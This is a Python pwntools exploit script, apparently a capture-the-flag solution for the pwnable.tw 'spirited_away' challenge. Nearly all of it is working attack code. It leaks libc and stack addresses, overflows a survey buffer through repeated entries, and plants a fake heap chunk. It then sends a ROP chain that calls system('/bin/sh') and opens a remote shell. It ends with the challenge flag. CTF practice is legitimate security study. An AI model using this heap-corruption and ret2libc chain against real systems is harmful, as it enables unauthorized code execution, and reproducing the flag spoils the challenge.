from pwn import *

elf = ELF("spirited_away")
libc = ELF("libc_32.so.6")
r = remote('chall.pwnable.tw', 10204)


def Sendraw(s):
    r.send_raw(s)


def Sendline(s):
    r.sendline(s)


def Padding(s, require_len, pad_ch):
    return s + (require_len - len(s)) * pad_ch


# leak libc base address
with log.progress("Stage 1: Leaking libc") as l:
    sleep(0.5)
    r.read()
    Sendraw(b'AAAA')
    r.read()
    Sendline(b'1')
    r.read()
    Sendraw(b'AAAA' * 6)
    r.read()
    Sendraw(b'AAAA')
    r.readuntil(b'AAAA' * 6)
    recv = r.read(4)
    recv.__repr__(), r.read()
    libc_IO_file_sync0_offset_7 = unpack(recv, 32)
    libc_IO_file_sync0 = libc_IO_file_sync0_offset_7 - 7
    libc_base_addr = libc_IO_file_sync0 - 0x000675E0
    libc_system = libc_base_addr + 0x0003A940
    libc_bin_sh_addr = libc_base_addr + 0x00158e8b
    l.success(hex(libc_base_addr))

# leak stack address
with log.progress("Stage 2: Leaking stack") as l:
    Sendline(b'y')
    r.read()
    Sendraw(b'AAAA')
    r.read()
    Sendline(b'1')
    r.read()
    Sendraw(b'A' * 80)
    r.read()
    Sendraw(b'AAAA')
    r.readuntil(b'A' * 80)
    recv = r.read(8)
    recv.__repr__(), r.read()
    main_ebp = unpack(recv[0:4], 32)
    survey_ebp = main_ebp - 0x20
    survey_esp = survey_ebp - 0xf8
    survey_return_addr = unpack(recv[4:8], 32)
    survey_reason_buf_addr = survey_ebp - 0x50
    assert (survey_return_addr == 0x8048908)
    log.info('main_ebp --> %s' % hex(main_ebp))
    log.info('survey_ebp --> %s' % hex(survey_ebp))
    log.info('survey_esp --> %s' % hex(survey_esp))
    log.info('survey_return_addr --> %s' % hex(survey_return_addr))
    l.success()
# overflow 
with log.progress("Stage 3: Overflowing chunks") as l:
    cnt = 2
    while cnt < 100:
        if len(str(cnt)) == 1:
            Sendline(b'y')
            r.read(),
            Sendraw(b'AAAA')  # name
            r.read(),
            Sendline(b'1')  # age
            r.read(),
            Sendraw(b'AAAA')  # reason
            r.read(),
            Sendraw(b'AAAA')  # comment
            r.read(),
        else:
            Sendline(b'y')
            r.read(),
            Sendline(b'1')  # age
            r.read(),
            Sendraw(b'AAAA')  # reason
            r.read(),
        cnt += 1
        l.status(f'{cnt}/100')
    l.success()

# build fake chunks
with log.progress("Stage 4: Sending fake chunk") as l:
    fake_chunk = pack(0, 32) + \
                 pack(0x41, 32) + \
                 b'A' * 56 + \
                 pack(0, 32) + \
                 pack(0x11, 32)
    l.status("fake chunk builded")
    # send fake chunks
    l.status("sending fake chunk")
    Sendline(b'y')
    r.read()
    Sendraw(b'AAAA')  # name
    r.read()
    Sendline(b'1')  # age
    r.read()
    Sendraw(fake_chunk)  # reason
    r.read()
    exp_buf = b'A' * 80 + b'AAAA' + pack(survey_reason_buf_addr + 8, 32)
    exp_buf += fake_chunk[0:ord(b'n') - len(exp_buf)]
    Sendraw(exp_buf)  # comment
    r.read()
    l.success()

# build ROP chain
with log.progress("Stage 5: Building ROP chain") as l:
    ROPchain = pack(libc_system, 32) + pack(survey_return_addr, 32) + pack(libc_bin_sh_addr, 32)
    Sendline('y')
    r.read()
    Sendraw(b'A' * (80 - 8) + b'AAAA' + ROPchain)  # name
    r.read()
    Sendline(b'1')  # age
    r.read()
    Sendraw(b'AAAA')  # reason
    r.read()
    Sendraw(b'AAAA')  # comment
    r.read()

    l.status("exit to trigger")
# exit to trigger
    Sendline(b'n')
    r.recvuntil(b"Bye!\n")
    l.success()
r.interactive()

# FLAG --> FLAG{Wh4t_1s_y0ur_sp1r1t_1n_pWn}
